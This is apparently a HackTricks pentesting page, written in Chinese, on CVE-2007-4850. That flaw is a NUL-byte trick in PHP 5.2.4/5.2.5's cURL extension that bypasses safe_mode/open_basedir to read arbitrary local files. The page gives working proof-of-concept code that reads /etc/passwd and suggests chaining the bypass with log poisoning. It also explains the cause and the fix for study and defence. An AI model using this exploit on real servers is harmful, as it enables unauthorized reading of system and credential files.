# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

本页记录了一个针对特定 PHP 5.2.x 构建，利用 cURL 扩展绕过 PHP safe_mode/open_basedir 检查的遗留技巧。尽管是遗留技术，但在 CTFs/本地旧安装中仍然有用。

- 受影响: PHP 5.2.4 和 5.2.5，启用了 ext/curl。
- 影响: 即使在 safe_mode 或 open_basedir 限制下，也能读取任意本地文件（不会直接执行代码）。
- ID: CVE-2007-4850.

来源 http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## 单行 PoC

如果启用了 safe_mode 或 open_basedir，且启用了 cURL，则下面的命令将返回当前脚本的内容：
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## 更明确的 PoC (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
注意：
- 使用双引号或 chr(0) 注入真实的 NUL 字节。百分号编码 (%00) 不会可靠地工作。
- 这是一个文件读取原语。可在可能的情况下与其他原语（log poisoning、session file inclusion 等）结合以进一步升级。

## 为什么这能奏效（简要）

漏洞存在于 PHP 5.2.4/5.2.5 在 ext/curl 中对 file:// URL 执行 safe_mode/open_basedir 检查的方式。检查会解析 URL 并验证一个路径组件，但由于对 NUL 字节的处理，它验证的字符串与 libcurl 实际使用的字符串不同。实际上，验证器可能会批准 NUL 之后的路径，而 libcurl 则将 NUL 之前的部分用作 URL 容器，从而实现绕过，导致读取放在 NUL 字节之后的文件。详情请参见原始分析和 curl/interface.c 中受影响的宏。[CVE-2007-4850]

## 限制与修复

- 在后续 5.2.x（例如被修补到 5.2.6 的发行版构建）中修复，方法是更正 ext/curl 中的解析/验证。
- 仅影响非常旧的 PHP 部署；safe_mode 在 PHP 5.4 中被移除，现代构建不再表现出该行为。

## 另见

其他 disable_functions/open_basedir 绕过方法和现代技术收集于此：

{{#ref}}
README.md
{{#endref}}



## 参考

- Ubuntu CVE 条目，包含补丁指引和受影响版本： https://ubuntu.com/security/CVE-2007-4850
- 技术写作及代码上下文（cxsecurity）： http://cxsecurity.com/issue/WLB-2008010060
{{#include ../../../../banners/hacktricks-training.md}}
